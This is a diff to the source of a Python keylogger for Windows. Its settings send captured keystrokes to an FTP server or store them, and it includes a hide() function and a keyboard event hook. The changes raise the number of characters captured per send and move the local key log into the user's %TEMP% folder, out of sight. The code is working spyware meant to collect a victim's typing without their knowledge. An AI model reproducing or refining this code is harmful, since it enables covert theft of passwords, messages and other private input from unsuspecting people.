@@ -28,12 +28,12 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 1000  # set num of chars before send log/store
+intCharPerSend = 1100  # set num of chars before send log/store
 
-blnUseTime = "False"  # if you prefer to use a timer for sending/storing, set this to True
-strTimePerSend = 120  # set how often to send/store logs in seconds
+blnUseTime = "False"  # if you prefer to use a timer to send logs, set this to True
+strTimePerSend = 120  # set how often to send logs in seconds
 
-blnStoreLocal = "False"  # True to save logs locally to winlog.txt instead
+blnStoreLocal = "False"  # True to save logs locally to temp folder as winlog.txt.
 blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
 
 def hide():
@@ -104,11 +104,12 @@ def OnKeyboardEvent(event):
             os._exit(1)
 
     def StoreMessagesLocal(strLogs, blnStop):
-        # log keys locally to winlog.txt
-        if os.path.isfile("winlog.txt"):
-            objLogFile = open("winlog.txt", 'a')
+        # log keys locally to winlog.txt in the %temp% directory
+        TMP = os.environ["TEMP"]
+        if os.path.isfile(TMP + "/winlog.txt"):
+            objLogFile = open(TMP + "/winlog.txt", 'a')
         else:
-            objLogFile = open("winlog.txt", 'w')
+            objLogFile = open(TMP + "/winlog.txt", 'w')
         if blnStop == "True":
             objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
         else:
